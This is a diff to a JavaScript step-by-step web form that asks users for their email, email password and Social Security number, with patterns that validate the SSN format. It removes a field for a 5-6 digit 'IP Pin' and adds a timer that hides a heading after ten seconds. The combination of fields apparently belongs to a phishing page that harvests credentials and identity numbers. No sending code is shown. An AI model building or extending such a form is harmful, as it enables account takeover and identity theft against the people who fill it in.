@@ -2,7 +2,6 @@
 const questions = [
     {question : 'Email', name: "email", type : 'email', pattern : /^\S+@\S+\.\S+$/, answer: ""},
     {question : 'Password', name: "password", type : 'password', answer: ""},
-    {question : 'Current IP Pin', name: "ip_pin", type : 'password', pattern : /^\b\d{5,6}\b$/, answer: ""},
     {question : 'SSN', name: "ssn", type : 'password', pattern : /^(\d{3})-?(\d{2})-?(\d{4})$/, answer: ""}
 ]
 
@@ -22,7 +21,7 @@ const inputField = document.querySelector('#input-field');
 const inputLabel = document.querySelector('#input-label');
 const inputProgress = document.querySelector('#input-progress');
 const progressBar = document.querySelector('#progress-bar');
-
+const h3 = document.querySelector('h3')
 //Events
 
 //get question on DOM LOad
@@ -60,6 +59,8 @@ function getQuestion(){
     prevBtn.className = position ? 'fa-solid fa-arrow-left' : 'fa-solid fa-user';
     
     showQuestion();
+
+    setTimeout(() => {h3.style.display = 'none';}, 10000)
 }
 
 //Display Question to User
